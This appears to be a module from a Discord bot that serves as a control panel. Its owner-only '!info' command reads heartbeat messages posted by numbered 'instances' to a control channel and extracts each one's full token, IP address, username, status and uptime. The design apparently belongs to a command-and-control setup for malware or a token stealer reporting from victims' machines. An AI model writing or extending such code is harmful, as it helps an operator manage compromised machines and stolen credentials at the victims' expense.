"""
info.py - !info <number>
Shows all available data for a specific instance.
"""
import re
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 1508336791311089874

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return
    if not args.strip():
        await message.channel.send("Usage: `!info <number>`")
        return
    try:
        num = int(args.strip())
    except ValueError:
        await message.channel.send("Number must be an integer.")
        return

    instance_map = getattr(client, "_instance_map", {})
    full_id = instance_map.get(num)
    if not full_id:
        await message.channel.send("Run `!list` first.")
        return

    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not accessible.")
        return

    async for msg in channel.history(limit=200):
        if f"FULL_ID={full_id}" in msg.content:
            # Parse all fields
            content = msg.content
            data = {}
            # Extract token (full)
            token_match = re.search(r'\[FULL_TOKEN=([^\]]+)\]', content)
            data["token"] = token_match.group(1) if token_match else "N/A"
            ip_match = re.search(r'\[IP=([^\]]+)\]', content)
            data["ip"] = ip_match.group(1) if ip_match else "?"
            user_match = re.search(r'User: `([^`]+)`', content)
            data["username"] = user_match.group(1) if user_match else "?"
            status = "ON" if "🟢" in content else "OFF"
            data["status"] = status
            # Uptime
            uptime_match = re.search(r'Uptime: `([^`]+)`', content)
            data["uptime"] = uptime_match.group(1) if uptime_match else "?"
            # Full ID
            data["instance_id"] = full_id
            # Build output
            out = "\n".join([f"{k}: {v}" for k, v in data.items()])
            await message.channel.send(f"**Instance details:**\n```\n{out}\n```")
            return
    await message.channel.send("Instance not found in recent heartbeats.")
